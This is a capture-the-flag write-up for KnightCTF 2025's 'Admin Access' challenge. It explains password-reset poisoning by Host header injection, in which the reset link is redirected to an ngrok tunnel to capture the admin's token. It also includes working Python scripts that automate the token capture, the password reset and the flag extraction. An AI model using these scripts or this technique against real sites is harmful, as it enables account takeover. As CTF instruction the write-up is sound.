# Admin Access

<!--more-->
### Initial Analysis

The site appeared as follows, with a login screen:

![Site Presentation](/images/KnightCTF-2025/Admin-Access/site_presentation.png "Site Presentation")

After completing the registration and login phase, you would enter a completely empty dashboard where the only available action was to log out. That’s when I realized that registering was pointless. Inspecting the page source, I found a strange comment:

![Admin Email](/images/KnightCTF-2025/Admin-Access/admin_email.png "Admin Email")

the comment revealed an email, most likely belonging to the account containing the flag. Continuing to explore the site since it was a black-box challenge without any files I found the "Forgot Password" section:

![Forgot Password](/images/KnightCTF-2025/Admin-Access/forgot_password.png "Forgot Password")

Where it was possible to specify an email to reset a password. At this point, I thought about resetting the password for the account associated with the email I had found earlier. And I considered a Host Header Injection.

### Exploit

So i started ngrok on port 80:
{{< typeit code=bash >}}
ngrok http 80
{{< /typeit >}}
And then, using Burp Suite, I modified the Host header to `Host: ngrok_link`. By sending the request with the modified Host header through ngrok, I was able to extract the reset token from the previously sent "Forgot Password" request with the email kctf2025@knightctf.com:

![Intercept](/images/KnightCTF-2025/Admin-Access/intercept.png "Intercept")

After extracting the valid token, I reset the password using the obtained link and logged in with the account using the following credentials:

```
username: kctf2025 
password: new_password
```

![Manual Flag](/images/KnightCTF-2025/Admin-Access/manual_flag.png "Manual Flag")

### Automated Exploit

I also created a fully automated exploit that performs the entire process described earlier:

```bash
ngrok http 8080
(set the ngrok url in the request.py file)
python exploit.py
python request.py
```
this is `exploit.py`: 

```python 
import http.server
import socketserver
import requests
import re
from urllib.parse import urlparse, parse_qs

class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):

        # Extract the token parameter from the request
        token = parse_qs(urlparse(self.path).query).get('token', [None])[0]
        self.send_request(token)

    def send_request(self, token):

        s = requests.Session()
        url = "http://45.56.68.122:7474/"

        password = "supermario45"
        data ={
            "token":token,
            "new_password":password
        }
        # Request for the password reset of the admin account
        s.post(url+"reset-password", data=data).text

        credentials={
            "username":"kctf2025",
            "password":password
        }
        # Request login admin account with Flag extraction via Regex
        print("\nFLAG: " + re.search(r'KCTF{[^}]+}', s.post(url, data=credentials).text).group(0))

def start_server():
    PORT = 8080
    with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
        httpd.serve_forever()

if __name__ == "__main__":
    start_server()
```

and this is `request.py`:

```python
import requests

requests.post("http://45.56.68.122:7474/forgot-password", data={"email":"kctf2025@knightctf.com"}, headers={"Host":"6cde-93-70-84-224.ngrok-free.app"})
```

### Flag
{{< admonition danger "Flag" >}}
{{< typeit tag=h4 >}}
KCTF{PaSsW0rD_ReSet_p0is0n1ng_iS_FuN}
{{< /typeit >}}
{{< /admonition >}}
